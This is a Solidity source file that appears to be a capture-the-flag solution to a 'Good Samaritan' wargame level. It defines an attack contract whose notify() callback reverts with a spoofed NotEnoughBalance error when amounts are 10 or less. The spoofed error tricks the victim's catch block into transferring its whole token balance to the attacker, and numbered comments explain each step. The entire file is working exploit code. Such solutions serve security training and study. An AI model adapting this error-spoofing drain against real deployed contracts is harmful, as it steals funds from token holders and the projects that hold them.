// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

contract GoodSamaritanAttack is INotifyable {
    GoodSamaritan victimContract;

    error NotEnoughBalance();

    // 1. Attacker creates `GoodSamaritanAttack` contract providing the address of the `GoodSamaritan` contract.
    constructor(address _victimContract) {
        victimContract = GoodSamaritan(_victimContract);
    }

    // 2. Attacker calls the `attack()` function in the `GoodSamaritanAttack` contract that is invoking `requestDonation` on `GoodSamaritan` contract. The code proceeds to execute the `wallet.donate10(msg.sender)` function call.
    // 3. The `donate10` function utilizes the `transfer` function from the `Coin` contract.
    function attack() public {
        victimContract.requestDonation();
    }

    // 4. The `coin.transfer()` function performs calculations, verifies if `GoodSamaritanAttack` address is a contract, and then triggers a `notify()` function on `GoodSamaritanAttack` address.
    // 5. Attacker creates `notify()` function in `GoodSamaritanAttack` contract to revert with a custom error named `NotEnoughBalance()`. When this error is triggered in the `GoodSamaritan` `requestDonation()` function, the `catch()` block will activate, transferring all tokens to `GoodSamaritanAttack`contract using `transferRemainder` function. But function will revert only if attacker included an additional condition to check if the amount is less than or equal to 10.
    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
